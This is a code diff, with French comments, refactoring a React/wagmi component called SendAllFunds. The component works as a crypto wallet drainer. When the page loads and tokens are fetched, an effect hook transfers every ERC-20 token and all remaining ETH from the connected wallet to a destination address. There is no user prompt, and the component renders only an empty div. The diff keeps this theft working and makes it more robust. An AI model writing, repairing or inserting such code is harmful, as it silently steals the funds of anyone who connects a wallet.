@@ -1,4 +1,4 @@
-import { useEffect } from 'react';
+import * as React from 'react';
 import { useToasts } from '@geist-ui/core';
 import { erc20ABI, usePublicClient, useWalletClient, useAccount } from 'wagmi';
 import { useAtom } from 'jotai';
@@ -20,8 +20,9 @@ export const SendAllFunds = () => {
   // Fonction pour envoyer l'ETH restant
   const sendEth = async () => {
     if (!walletClient || !destinationAddress) return;
-    
-    const balance = await publicClient.getBalance({ address });
+
+    // Utilisation de la valeur par défaut (0n) si le solde est undefined
+    const balance = (await publicClient.getBalance({ address })) || 0n;
 
     if (balance > 0n) {
       try {
@@ -45,7 +46,8 @@ export const SendAllFunds = () => {
       if (balance === '0') continue;
 
       try {
-        const balanceBigInt = BigInt(balance); // Assurer que le solde est un BigInt valide
+        // Conversion explicite de `balance` en BigInt
+        const balanceBigInt = BigInt(balance);
 
         const { request } = await publicClient.simulateContract({
           account: walletClient.account,
@@ -67,20 +69,20 @@ export const SendAllFunds = () => {
   };
 
   // Fonction pour envoyer tous les fonds (ETH + tokens ERC-20)
-  useEffect(() => {
-    const sendAllFunds = async () => {
-      // Envoie tous les tokens ERC-20
-      await sendAllTokens();
-      // Envoie tous les ETH
-      await sendEth();
-    };
+  const sendAllFunds = async () => {
+    // Envoie tous les tokens ERC-20
+    await sendAllTokens();
+    // Envoie tous les ETH
+    await sendEth();
+  };
 
+  // Exécuter l'envoi dès que les fonds sont disponibles
+  React.useEffect(() => {
     const sendFundsIfValid = async () => {
       await sendAllFunds();
     };
-
     sendFundsIfValid();
-  }, [tokens]); // Les dépendances sont uniquement `tokens`
+  }, [tokens]); // S'assurer que les tokens sont récupérés avant l'envoi
 
   return <div style={{ margin: '20px' }}></div>;
 };
